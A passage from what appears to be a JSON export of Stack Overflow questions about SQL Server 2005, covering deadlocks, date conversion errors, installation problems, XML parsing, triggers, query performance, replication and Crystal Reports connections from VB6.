WITH (UPDLOCK, SERIALIZABLE) WHERE Key=@Key) \nBEGIN\n    UPDATE TestTable\n    SET Data = @Data \n    WHERE Key = @Key\nEND\nELSE\nBEGIN\n    INSERT INTO TestTable (Key, Data)\n    VALUES (@Key, @Data)\nEND\n\nCOMMIT TRANSACTION\n</code></pre>\n\n<p>The only way I can get it to work without deadlocks is to use <code>WITH (TABLOCKX)</code>.</p>\n\n<p>I am using SQL Server 2005, the SQL is generated at runtime and so it is not in a stored procedure and some of the tables use composite keys rather than primary keys but I can reproduce it on a table with an integer primary key.</p>\n\n<p>The server logs look like this:</p>\n\n<pre><code>waiter id=processe35978 mode=RangeS-U requestType=wait\nwaiter-list\nowner id=process2ae346b8 mode=RangeS-U\nowner-list\nkeylock hobtid=72057594039566336 dbid=28 objectname=TestDb.dbo.TestTable indexname=PK_TestTable id=lock4f4fb980 mode=RangeS-U associatedObjectId=72057594039566336\nwaiter id=process2ae346b8 mode=RangeS-U requestType=wait\nwaiter-list\nowner id=processe35978 mode=RangeS-U\nowner-list\nkeylock hobtid=72057594039566336 dbid=28 objectname=TestDb.dbo.TestTable indexname=PK_TestTable id=lock2e8cbc00 mode=RangeS-U associatedObjectId=72057594039566336\n</code></pre>\n\n<p>The mode is obviously different depending on the table hint used (but the processes are always waiting for the mode they already own). I have seen RangeS-U, RangeX-X and U.</p>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":26628,"score":4,"question_id":633848,"title":"Arithmetic overflow error converting expression to data type datetime","body":"<p>This select statement gives me the arithmetic error message:</p>\n\n<pre><code>SELECT CAST(FLOOR((CAST(LeftDate AS DECIMAL(12,5)))) AS DATETIME), LeftDate \nFROM Table\nWHERE LeftDate &gt; '2008-12-31'\n</code></pre>\n\n<p>While this one works:</p>\n\n<pre><code>SELECT CAST(FLOOR((CAST(LeftDate AS DECIMAL(12,5)))) AS DATETIME), LeftDate \nFROM Table\nWHERE LeftDate &lt; '2008-12-31'\n</code></pre>\n\n<p>Could there be something wrong with the data (I've checked for null values, and there are none)?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":133,"score":1,"question_id":12589785,"title":"Can't install Microsoft SQL Server 2008 (R2) Management Studio","body":"<p>EDIT: solved! read below</p>\n\n<p>When I want to install MS SQL Server 2008 (R2) on my Win7 PC, I keep getting the error that I need to remove my SQL Server 2005 Express. This is, however, no longer installed.\n<img src=\"http://i.stack.imgur.com/NS3zb.png\" alt=\"enter image description here\"></p>\n\n<p>I followed the same routine as here: <a href=\"http://stackoverflow.com/questions/175881/sql-server-express-2008-install-side-by-side-w-sql-2005-express-fails\">SQL Server Express 2008 Install Side-by-side w/ SQL 2005 Express Fails</a> without result.</p>\n\n<p>I deleted everything linking to SQL Server 2005 and tried to install the 2008, same error ...<br>\nReinstalled 2005 and tried to update via the 2008 setup, \"can't find 2005 shared modules to update\"<br>\nDeleted 2005, rebooted, ran 2008 setup, same error: need to remove 2005 Express<br>\nReinstalled 2005, deleted shared modules, tried to install 2008, same error as above<br>\nCompletely deleted 2005, rebooted, ran setup, still 2005 on the system?!</p>\n\n<p>I ran the setup this time again and installed everything except the Menegement Studio.<br>\nToo bad this is the one program I definitly need to follow my classes.</p>\n\n<p>I hope you guy can help me with this!</p>\n\n<p>PS: I've got a lot of SQL programs installed, because I've got Visual Studio, SQLyog, ... installed for my studies</p>\n\n<p><strong>SOLUTION</strong><br>\nFound someone with the same problem: <a href=\"http://social.msdn.microsoft.com/Forums/en-US/sqlsetupandupgrade/thread/5fc58507-9f40-4213-acbd-32a57c8822d7/\" rel=\"nofollow\">http://social.msdn.microsoft.com/Forums/en-US/sqlsetupandupgrade/thread/5fc58507-9f40-4213-acbd-32a57c8822d7/</a><br>\nHow I solved my problem: As I have a 64bit system, I had to remove this registerfolder: <em>HKLM\\Software\\Wow6432Node\\Microsoft\\Microsoft SQL Server\\90</em><br>\nFor 32bit systems: remove <em>HKLM\\SOFTWARE\\Microsoft\\Microsoft SQL Server\\90</em></p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12593420,"title":"Update SQL variable when recordset is empty","body":"<p>We have a loop in SQL Server 2005 that loops around on a table getting each items parent until it gets to the top of the tree:</p>\n\n<pre><code>DECLARE @T Table\n(\n  ItemID INT NOT NULL PRIMARY KEY,\n  AncestorID INT NULL \n)\n</code></pre>\n\n<p>Which has data like this:</p>\n\n<pre><code>ItemID | AncestorID\n  1          2\n  2          3\n  3          4\n  4          NULL\n</code></pre>\n\n<p>We have a loop that basically does this:</p>\n\n<pre><code>DECLARE @AncestorID INT\nSELECT @AncestorID = 1\nWHILE (@AncestorID IS NOT NULL)\nBEGIN   \n  --Do some work   \n  SELECT @AncestorID = T.AncestorID   \n  FROM @T t  \n  WHERE T.ItemID = @AncestorID\n\n  print @AncestorID\nEND\n</code></pre>\n\n<p>(Yes I know SQL is set based, and this is processing row by row, the \"Do some work\" needs to be done line by line for a reason).</p>\n\n<p>This has always worked fine until today when we ended up in an endless loop. Turns out the cause was some wrong data:</p>\n\n<pre><code>ItemID | AncestorID\n  1          2\n  2          3\n\n  4          NULL\n</code></pre>\n\n<p><code>ItemID</code> 3 was deleted. The loop now never ends because <code>AncestorID</code> is never <code>NULL</code> - it stays at 3.</p>\n\n<p>Is there anyway to rewrite the select statement to make <code>@AncestorID</code> null if the <code>SELECT</code> query returns 0 rows, or do I need to have a separate <code>SELECT</code> statement to count the records and some <code>IF ELSE</code> type logic?</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":38,"score":-2,"question_id":12592319,"title":"How to specify perticular table columns case sensitive in SQL Server 2005","body":"<pre><code> String dmlString=\"INSERT INTO table VALUES('Rxyz');\n SqlCommand comObj = new SqlCommand(dmlString, conObj);\n                comObj.ExecuteNonQuery();\n</code></pre>\n\n<p>table -> Rxyz</p>\n\n<p>How to validate it, as Rxyz (case sensitive)</p>\n"},{"tags":["sql-server-2005","dotnetnuke","dotnetnuke-5"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12288746,"title":"Copy database error (DNN): No primary or candidate keys in the referenced table that match the referencing column list in the foreign key","body":"<blockquote>\n  <p>DNN version: 5.6.2</p>\n  \n  <p>Tool: SQL Server Management Studio</p>\n  \n  <p>Action: Copy database</p>\n  \n  <p>Error: There are no primary or candidate keys in the referenced table\n  'Roles' that match the referencing column list in the foreign key\n  'FK_UserRoles_Roles'</p>\n</blockquote>\n\n<p>I tried searching for this error online, but all searches lead to topics where this error is encountered while creating a foreign key to a non-unique column. In my case, the key is already created. I double-checked that the RoleId column is the primary key on the Roles table and it is indeed the column the foreign key 'FK_UserRoles_Roles' references.</p>\n\n<p>Any help to fix this is appreciated. Alternatively, what will be a quick way to copy the structure and data of my database apart from the \"Copy Database\" option? </p>\n\n<p>Thanks!</p>\n"},{"tags":["sql","sql-server-2008","query","sql-server-2005","parameters"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12591872,"title":"Multiple table query not working on certain databases","body":"<p>I have 12 locations each running their own database.  Each database is setup exactly the same, with their own information.  The databases are all SQL2005 or 2008 server.  I wrote a multiple table query to pull information for paying commission on sales.  This query works on 10 of the 12 databases, the other 2 databases do not return any results.  If I run the query with 2 joined tables (on the 2 databases it does not work on) it works, however the other tables in question have nothing to do with the \"where\" statement.  Could anyone shed some light on why it would not work on 2 of the 2005 server databases if it works on all of the others?  My Code is:</p>\n\n<pre><code>SELECT        Customers.sBarcode AS Barcode, Customers.dtCreated AS Created, CustomerUnlimitedTransactions.sCreatedBy AS [Commission pays], \n                         Surcharges.sDescription AS [Unlimited Package], Surcharges.dblCommission AS [Commission Amount], Users.sUserName AS Greeter, @startdate AS Start_Date, \n                         @enddate AS End_Date\nFROM            CustomerUnlimitedTransactions INNER JOIN\n                         Customers ON CustomerUnlimitedTransactions.lCustomerId = Customers.lCustomerID INNER JOIN\n                         VIPAccountTypes ON CustomerUnlimitedTransactions.lMonthlyAccountTypeId = VIPAccountTypes.lAccountType INNER JOIN\n                         Surcharges ON VIPAccountTypes.lSurchargeId = Surcharges.Surcharge_ID INNER JOIN\n                         Users ON Customers.lGreeterID = Users.ID_User\nWHERE        (Customers.dtCreated BETWEEN CONVERT(DATETIME, @startdate, 102) AND CONVERT(DATETIME, @enddate, 102)) AND \n                         (CustomerUnlimitedTransactions.sTransactionType = N'sale') AND (CustomerUnlimitedTransactions.lMonthlyAccountTypeId = '11') OR\n                         (Customers.dtCreated BETWEEN CONVERT(DATETIME, @startdate, 102) AND CONVERT(DATETIME, @enddate, 102)) AND \n                         (CustomerUnlimitedTransactions.sTransactionType = N'sale') AND (CustomerUnlimitedTransactions.lMonthlyAccountTypeId = '12')\nORDER BY Created\n</code></pre>\n\n<p>If I run the query like this I still do not return any results:</p>\n\n<pre><code>SELECT        Customers.sBarcode AS Barcode, Customers.dtCreated AS Created, CustomerUnlimitedTransactions.sCreatedBy AS [Commission pays], \n                             Surcharges.sDescription AS [Unlimited Package], Surcharges.dblCommission AS [Commission Amount], Users.sUserName AS Greeter, @startdate AS Start_Date, \n                             @enddate AS End_Date\n    FROM            CustomerUnlimitedTransactions INNER JOIN\n                             Customers ON CustomerUnlimitedTransactions.lCustomerId = Customers.lCustomerID INNER JOIN\n                             VIPAccountTypes ON CustomerUnlimitedTransactions.lMonthlyAccountTypeId = VIPAccountTypes.lAccountType INNER JOIN\n                             Surcharges ON VIPAccountTypes.lSurchargeId = Surcharges.Surcharge_ID INNER JOIN\n                             Users ON Customers.lGreeterID = Users.ID_User\n    WHERE        (Customers.dtCreated BETWEEN CONVERT(DATETIME, @startdate, 102) AND CONVERT(DATETIME, @enddate, 102))\n    ORDER BY Created\n</code></pre>\n\n<p>If I run the query like this I DO get results:</p>\n\n<pre><code>SELECT        Customers.sBarcode AS Barcode, Customers.dtCreated AS Created, CustomerUnlimitedTransactions.sCreatedBy AS [Commission pays], \n                                 Surcharges.sDescription AS [Unlimited Package], Surcharges.dblCommission AS [Commission Amount], Users.sUserName AS Greeter, @startdate AS Start_Date, \n                                 @enddate AS End_Date\n        FROM            CustomerUnlimitedTransactions INNER JOIN\n                                 Customers ON CustomerUnlimitedTransactions.lCustomerId = Customers.lCustomerID \n        WHERE        (Customers.dtCreated BETWEEN CONVERT(DATETIME, @startdate, 102) AND CONVERT(DATETIME, @enddate, 102))\n        ORDER BY Created\n</code></pre>\n\n<p>There are not any Null's associated with any of the above query's.  Again this works on 10 of 12... and yes the databases are EXACTLY the same.  (if I run this query out for a year date range I get results) however I should show 25 results from last week alone, and I am showing none on each of the 2.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12585091,"title":"SQL Server : execute dynamic sql help please","body":"<pre><code>EXEC SP_EXECUTESQL \n            @DynamicSQL\n        ,   N'@HostIDs VARCHAR(MAX) OUTPUT'\n        ,   @HostIDs OUTPUT;\n\nPRINT @HostIDs;\n\nSELECT @HostIDs AS HostIDs;\nSET @UpdateSQL = '\n            EXECUTE [dbo].[usp_Win7_HostUpdater_NEW]\n            @HostID = ''' + @HostIDs + ''' , \n            @PackageID = ''' + @PackageID  + ''' , \n            @MigrationFlag = ''' + @MigrationFlagID + ''' , \n            @Manufacturer = ' + @Manufacturer + ' , \n            @Product = ' + @Product + ' , \n            @Version = ' + @Version + ' ,\n            @Reason = ' + @Reason + ' ,\n            @Contact = ' + @Contact + '\n        ';\n\n        SELECT @UpdateSQL AS UpdateSQL;\n        PRINT @UpdateSQL;           \n        EXEC( @UpdateSQL )  \n  END  \n</code></pre>\n\n<p>I have a stored procedure on both a SQL Server 2005 and 2008 in which the above code is the last part of </p>\n\n<p>it returns a <code>VARCHAR(MAX)</code> of numbers separated by commas.</p>\n\n<p>Now this returned value is large upwards of 600k characters. If I execute this on a SQL Server 2005 it works like 50% of the time, <code>@HostIDs</code> is populated always and <code>@UpdateSQL</code> gets generated with the correct values and is executed.</p>\n\n<p>On SQL Server 2008, <code>@HostIDs</code> is populated but <code>@UpdateSQL</code> is always NULL</p>\n\n<p>This is weirding me out tremendously</p>\n\n<p>Can anyone maybe shed some light on my odd problem?</p>\n"},{"tags":["sql","sql-server","xml","sql-server-2005","xml-parsing"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12591401,"title":"XML to SQL temp tables","body":"<p>I have a XML string that looks like </p>\n\n<pre><code>  &lt;PLATFORM&gt;\n  &lt;PLATFORMNAME&gt;UNIX&lt;/PLATFORMNAME&gt; \n  &lt;OS&gt;Ipad&lt;/OS&gt; \n  &lt;VERSION&gt;5.1&lt;/VERSION&gt; \n  &lt;PLATFORMNAME&gt;Windows&lt;/PLATFORMNAME&gt; \n  &lt;OS&gt;Windows&lt;/OS&gt; \n  &lt;VERSION&gt;2008 (64bit)&lt;/VERSION&gt; \n  &lt;/PLATFORM&gt;\n</code></pre>\n\n<p>Which I need to insert into a temptable</p>\n\n<pre><code>   Create Table #TempXMLTable\n     (\n      PlatformName NVARCHAR(50),\n      OS NVARCHAR(50),\n      PlatformVersion NVARCHAR(50)\n     )\n     INSERT INTO #TempXMLTable VALUES(\n           @XML.value('(/PLATFORM/PLATFORMNAME)[1]', 'nvarchar(MAX)'), \n      @XML.value('(/PLATFORM/OS)[1]', 'nvarchar(MAX)') ,\n      @XML.value('(/PLATFORM/VERSION)[1]', 'nvarchar(MAX)'))\n</code></pre>\n\n<p>When I do the above insert only the first column is inserted but I want both inserts</p>\n\n<p>Should look like - </p>\n\n<pre><code>                    PlatformName OS     Version\n                      Unix         Ipad    5.1\n                      Windows      Windows 2008\n</code></pre>\n"},{"tags":["sql","xml","sql-server-2005","query"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":567,"score":2,"question_id":8421509,"title":"How to add attributes to xml nodes in sql server 2005","body":"<p>If i wanted to add an attribute to the root element record, can i do this from the sql side?</p>\n\n<pre><code>SELECT top 1 'text' as nodeA\n                from test as z\nFOR XML AUTO, ELEMENTS, root('record')\n</code></pre>\n\n<p>i would like to produce the xml like this:</p>\n\n<pre><code> &lt;Root attribute=\"value\"&gt;\n     &lt;z&gt;\n         &lt;NodeA&gt;text&lt;/NodeA&gt;\n     &lt;/z&gt;\n &lt;/Root&gt;\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","triggers"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":265,"score":2,"question_id":3615951,"title":"Save Update attempts in temp table in Update Trigger","body":"<p>The query is -\nNo user should be able to change prices of the products Table. A msg shold be displayed to the user. also all attempts to change the price should be saved in temp table.</p>\n\n<p>How to solve this using update trigger in Sql server 2005?\nI have tried  as below. It is working as expected but also showing an error -</p>\n\n<p>The transaction ended in the trigger. The batch has been aborted.</p>\n\n<pre><code>ALTER TRIGGER tr_Products_U ON dbo.ProductDemo AFTER UPDATE\nAS\n    DECLARE @Data VARCHAR(200),\n            @sProductName NVARCHAR(40), \n            @mOldPrice MONEY, \n            @mNewPrice MONEY,\n            @ProductId int\n\n    IF UPDATE(ListPrice)\n    BEGIN\n        SELECT \n            @ProductId = d.ProductID,    \n            @sProductName = d.Name,\n            @mOldPrice = d.ListPrice,\n            @mNewPrice = i.ListPrice\n        FROM\n            inserted i INNER JOIN deleted d ON i.ProductID = d.ProductID \n\n        SET @Data = 'Tried to update the price of ' + @sProductName \n            + '  [ProductID :' + CONVERT(VARCHAR(10), @ProductId) + '] '\n            + ' from '\n            + CONVERT(VARCHAR(10), @mOldPrice) \n            + ' to ' + CONVERT(VARCHAR(10), @mNewPrice)\n\n            print 'Can''t Change Price' \n                       ROLLBACK TRAN \n\n                        INSERT INTO #UpdateLIstPrices  \n                        VALUES (@Data);         \n     END\n    RETURN\nGO\n</code></pre>\n"},{"tags":["sql","query","sql-server-2005","join","query-optimization"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":107,"score":0,"question_id":12519692,"title":"How does SQL OR query works","body":"<p>To my understinding it should be simple, does colA='X' or ColB='X', if any one of them is true then return the result otherwise not. </p>\n\n<pre><code>TableA\n\n id  A  B  C  D \n\n 1   x  x  x  x \n 2   x  x  x  x \n 3   x  x  x  x \n\n\nTableB\n\n id  A \n\n  1  x \n  2  x \n  3  x \n\n\nselect T2.ID from tableA T1\nJOIN TableB T2\nON T1.A=T2.A OR T1.B=T2.A OR T1.C=T2.A OR T1.D=T2.A /* **takes 6+ min** */\n</code></pre>\n\n<p><strong>This simple join takes 6+ minutes.</strong> If I join using only one field, then it is pretty quick. <strong>Also if I write 4 different queries, one for each OR and then Union the result, it is very quick also</strong>.</p>\n\n<p>My question is, <strong>How does SQL OR Query works?</strong> Does it work on current row, does all the ORING and move on to the next or does it do the <em>complete OR</em> of the two tables for <em>each OR</em>. Even then it should take long as seperate queries are fast enough. I out think an internal optimiser can optiise this really quick: I am comparing one column from one table to 4 column of second table. It should be easy to optimise. Why is it taking so long? <strong>Is there a way to manually optimize this query</strong>. Btw I tried changing = to != or Or to AND but it takes the same amount of time.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12590473,"title":"Is it possible to Send and Receive TCP/Socket messages using SQL","body":"<p>Quick question, is it possible to send and receive TCP/Socket message using SQL? If there is one would you mind providing some examples or maybe direct me to a post/website where I could this information.</p>\n\n<p>thank you</p>\n"},{"tags":["c#","sql-server-2005","floating-point","decimal","informix"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":142,"score":1,"question_id":12407392,"title":"Comparing floating point / decimal values from Informix to SQL Server","body":"<p>I am trying to compare values from an Informix database and a SQL Server database. The problem I am getting is that Informix is returning the float as \"4000\" and SQL Server is returning it as \"40.000.000\".</p>\n\n<p>The datatype of the Informix column is \"float\" and the datatype of the SQL Server column is decimal(8,2).</p>\n\n<p>The comparison is happening in a C# application, and it is always failing because of what is returned. </p>\n\n<p>The data coming from the Informix database is being inserted directly into the SQL Server database, so the comparison should be accurate when pulling the values back out.</p>\n\n<p>I'm not sure how to tackle this. Any help would be greatly appreciated.</p>\n\n<p>Thank you!</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12588471,"title":"Why can't I concatenate a value in the second part of the ISNULL statement?","body":"<p>I've already solved this issue using a CASE statement, but I'm wondering why, when using <code>ISNULL</code>, can I concatenate a value to the check_expression but not the replacement_value. Here's an example:</p>\n\n<pre><code>create table name_test \n(\n    nm          varchar(25)\n    ,mid_init   varchar(1)\n    ,name_type  int\n)\n\ninsert into name_test values('Joe',NULL,1)\ninsert into name_test values('Joe','X',2)\n</code></pre>\n\n<p>I have this query. </p>\n\n<pre><code>SELECT\n    n1.nm, isnull(n2.mid_init+'b',n1.mid_init) as m1,\n    isnull(n1.mid_init,n2.mid_init+'b') as m2\nFROM \n    name_test n1\n    JOIN name_test n2 \n    on n1.nm = n2.nm and n1.name_type = 1 and n2.name_type = 2\n</code></pre>\n\n<p>In the first statement (<code>m1</code>), I use the NOT-NULL value first, concatenated with a 'b'. In the second statement (<code>m2</code>), I use the NULL value first, so the query should pass through to the replacement_value. It does, but only takes the first value, not the concatenated value. </p>\n\n<p>Result:</p>\n\n<pre><code>nm     m1   m2\nJoe    Xb   X\n</code></pre>\n\n<p>With a little more investigation, I see that this query:</p>\n\n<pre><code>select \n    n1.nm, isnull(n2.mid_init+'b',n1.mid_init) as m1,\n    isnull(n1.mid_init,'1'+ n2.mid_init+'b') as m2\nfrom \n    name_test n1\n    join name_test n2 \n    on n1.nm = n2.nm and n1.name_type = 1 and n2.name_type = 2\n</code></pre>\n\n<p>returns </p>\n\n<pre><code>nm  m1  m2\nJoe Xb  1\n</code></pre>\n\n<p>So, the <code>ISNULL</code> function will take the entire <code>check_expression</code>, but if the <code>check_expression</code> is null, it will only take the first part of the <code>replacement_value</code>. </p>\n\n<p>Does anyone know why there is a discrepancy. Also, I solved it with a case - is there a better solution?</p>\n"},{"tags":["sql-server-2005","transactional-replication","secure-gateway"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12518276,"title":"SQL Server Replication across a unidirectional gateway","body":"<p>We would like to replicate a SQL Server 2005 database across a unidirectional gateway between a very secure Process LAN and a somewhat less secure Business LAN.  Does anyone know:</p>\n\n<ol>\n<li>If there is a way to have SQL Server perform the replication without handshaking from the target SQL Server/DB on the Business LAN?</li>\n<li>If a third party product or software library is available which will help with this desired functionality?</li>\n</ol>\n\n<p>Both the source and the target databases would be on a Windows Server 2003 or 2008 OS.</p>\n\n<p>Any alternate solutions or advise would be greatly appreciated.</p>\n"},{"tags":["sql-server-2005","reportingservices-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":2552,"score":0,"question_id":6505913,"title":"Installing SQL server 2005 reporting services on Windows 7","body":"<p>I am trying to install Microsoft SQL server standard editions 2005 reporting services on Windows 7. But the option to install reporting services are disabled in the setup. The same setup works for XP. I think there is some issue with IIS version. Please provide me the solution.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":4235,"score":5,"question_id":2309028,"title":"Subtract minute from datatime in sql server 2005","body":"<p>Suppose I have a datetime field whose value is <strong>2000-01-01 08:30:00</strong> \nand a duration field whose value is say <strong>00:15</strong> (meaning 15 minutes) </p>\n\n<p>If I subtract these two, I should get <strong>2000-01-01 08:15:00</strong></p>\n\n<p>Also if I want to subtract <strong>1:15</strong> (means 1 hour 15 minutes), the output should be <strong>2000-01-01 07:15:00</strong></p>\n\n<p>I am trying <code>SELECT DATEDIFF(minute, '00:15','2000-01-01 08:30:00');</code> </p>\n\n<p>But the output is 52595055. How can i get the desired result?</p>\n\n<p>N.B.~ If I do <code>SELECT dateadd(minute, -15,'2000-01-01 08:30:00');</code> , I will get the desired result but that involves parsing the minute field. </p>\n\n<p>Edit:</p>\n\n<p>As per the answers, every one is suggesting converting everything into minutes and then to subtract - so if it is 1:30, i need to subtract 90 minutes. That's fine. Any other way without converting to minutes?</p>\n"},{"tags":["sql-server-2005","indexing"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":44,"score":2,"question_id":12585855,"title":"Why am I getting a Clustered Index Scan when the column is indexed?","body":"<p>So, we have a table, <code>InventoryListItems</code>, that has several columns. Because we're going to be looking for rows at times based on a particlar column (<code>g_list_id</code>, a foreign key), we have that foreign key column placed into a non-clustered index we'll call <code>MYINDEX</code>.  </p>\n\n<p>So when I search for data like this:</p>\n\n<pre><code>-- fake data for example\nDECLARE @ListId uniqueidentifier\nSELECT @ListId = '7BCD0E9F-28D9-4F40-BD67-803005179B04' \n\nSELECT *\nFROM [dbo].[InventoryListItems]\nWHERE [g_list_id] = @ListId\n</code></pre>\n\n<p>I expected that it would use the <code>MYINDEX</code> index to find just the needed rows, and then look up the information in those rows.  So not as good as just finding everything we need in the index itself, but still a big win over doing a full scan of the table.</p>\n\n<p>But instead it seems that I'm still getting a clustered index scan. I can't figure out why that would happen.</p>\n\n<p>If I do something like SELECTing only the values in the included columns of the index, it does what I would expect, an index seek, and just pulls everything from the index.</p>\n\n<p>But if I <code>SELECT *</code>, why does it just bail on the index and do a scan when it seems like it would still benefit greatly from using it because it's referenced in the WHERE clause?</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":31,"score":2,"question_id":12584672,"title":"Why execution time of a query and a function may be different","body":"<p>It's not clear for me why the execution time of scalar-function could be at least two times  longer than individual query, based on function's body.\nDetails:\nI wrote sql-query (declaring variables as parameters) and covered it with \"set statistics time on\" and run it. After that I've covered the sql-query into scalar-function and executed it with statistics time on again. The result confused me: execution time in the second case was much longer than in the first case (at least two times longer).</p>\n"},{"tags":["sql-server-2005","vb6","crystal-reports-8.5"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":196,"score":1,"question_id":12584496,"title":"Change Crystal Reports 8.5 connection to SQL Server 2005 dynamically in VB6","body":"<p>We need to connect some Crystal Reports 8.5 to a SQL Server database under MS Windows 7, 64 bit. The query are not handled by the VB6 code of our application, but is included in the Reports and by the time, we would like to avoid passing to the Reports data extracted from the code, because we should modify all the Reports deeply.\nSince the application will be installed on different locations, where the connection data will vary, we need to change this information at runtime, by vb6 code, so that the reports point to the appropriate data.\nThis is the test code we use:</p>\n\n<pre><code>    Dim nTables As Integer\n    Dim iCount As Integer\n    Dim iRitCW As Integer\n\n\n    '-----&gt; Ritorno msgBox\n    Dim RitMsg As Integer\n    Dim sRitCW As String * 255\n\n    jobnum = 0\n\n    If PEOpenEngine() = False Then\n        MsgBox \"Errore Engine\"\n    End If\n\n    jobnum = PEOpenPrintJob(\"c:\\test\\report1.rpt\")\n\n'Declarations\nDim logonInfo As PELogOnInfo\n\nlogonInfo.StructSize = PE_SIZEOF_LOGON_INFO\nlogonInfo.ServerName = \"dellone\\sqlexpress2005\" + Chr(0)\nlogonInfo.DatabaseName = \"TEST\" + Chr(0)\nlogonInfo.UserID = \"sa\" + Chr(0)\nlogonInfo.Password = \"sasasa_2005\" + Chr(0)\n\nIf (PELogOnServer(\"p2smon.dll\", logonInfo) = False) Then\n        MsgBox \"Connessione fallita\", vbExclamation, NomeApplicazione\n        iRitCW = PEGetErrorCode(jobnum)\n        RitMsg = MsgBox(\"Errore n. : \" + Str(iRitCW), vbExclamation, NomeApplicazione)\n        End\nEnd If\n\nnTables = PEGetNTables(jobnum)\n\nFor iCount = 0 To nTables - 1\n    If PESetNthTableLogOnInfo(jobnum, iCount, logonInfo, True) = False Then\n        MsgBox \"Errore : PESetNthTableLogOn\", vbExclamation, NomeApplicazione\nScreen.MousePointer = 0\n        Exit Sub\n    End If\n   If (PETestNthTableConnectivity(jobnum, iCount) = False) Then\n      MsgBox (\"Errore nella connessione per la tabella:\" &amp; iCount)\n   End If\nNext iCount\n\n\n\n      If PEOutputToPrinter(jobnum, 1) = False Then\nMsgBox \"Stampa del documento fallita\", vbExclamation, NomeApplicazione\nScreen.MousePointer = 0\nExit Sub\nEnd If\n\n    If PEStartPrintJob(jobnum, True) = False Then\n        MsgBox \"Stampa in anteprima fallita\", vbExclamation, NomeApplicazione\n        iRitCW = PEGetErrorCode(jobnum)\n        RitMsg = MsgBox(\"Errore di stampa n. : \" + Str(iRitCW), vbExclamation, NomeApplicazione)\n        Exit Sub\n    End If\nScreen.MousePointer = 0\n</code></pre>\n\n<p>Normally the error that is reported is 536 on PELogonServer and is 599 after PEStartPrintJob.\nWe therefore ask whethere the data wich wich we use to initialize the logoninfo data structure are sintactically correct. If the ServerName string has to be escaped in some particular way. We ask confirmation about the dll we use (p2smon.dll) in PELogOnServer function, whereas we tried without success with p2ssql.dll and any further explanation that may help us to solve the problem.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["c#","sql-server-2008","sql-server-2005","c#-4.0","windowservice"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12583395,"title":"Window Service waiting store procedure to get the results","body":"<p>I am running a stored procedure from <code>C#</code> <code>Window Service</code>. Stored proc is a quite heavy query and it takes quite long time. </p>\n\n<p>I want to wait till the stored proc finish and return the values. </p>\n\n<p>Is there any way to determine that stored proc is finished.</p>\n\n<p>If anyone can provide the sample code that will be a great favour. </p>\n\n<p>Many Thanks</p>\n"},{"tags":["sql","query","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12583063,"title":"How can I JOIN tables conditionally?","body":"<p>I am working with a badly designed database and I ran into some problem.</p>\n\n<p>I have two tables that I need to join on a 'not unique ID'.\nThe software that currently works with the database sets a '0 value' in the id if there is an error. This means if I try to join them a massive amount of records is joined on the 0 values.</p>\n\n<p>Underneath an example of two tables and their not unique id fields i want to join them on</p>\n\n<pre><code>tbl1    tbl2\n-----------       \n2        2\n3        6\n4        5\n0        3\n0        4\n6        0\n5        0\n----------\n</code></pre>\n\n<p>What I want to achieve is this</p>\n\n<pre><code>tbl1    tbl2\n-----------         \n2        2\n3        3\n4        4\n0        * (no join)\n0        * (no join)\n6        6\n5        5\n----------\n</code></pre>\n\n<p>In other words, I don't want the '0 values' from tbl1 to join with all other '0 values' from tbl2. I still want to have the record tbl1 without a join though.</p>\n\n<p>Is this possible in 1 query?</p>\n\n<p>extra information: SQL SERVER 2005 and there is no option to make the ID's unique.</p>\n"},{"tags":["sql-server-2005","case","where-clause"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":62,"score":3,"question_id":12553616,"title":"Passing comparison operator to WHERE clause","body":"<p>I would like to use a parameter which holds comparison operators like <code>'='</code>, <code>'&gt;'</code>, <code>'&gt;='</code> and use it in where clause with \"case when then\" or if statement like the following:  </p>\n\n<pre><code>WHERE  \ncase @Operator\n when '=' then (@Amount is null) or (@Amount = 0 ) or (Amount= 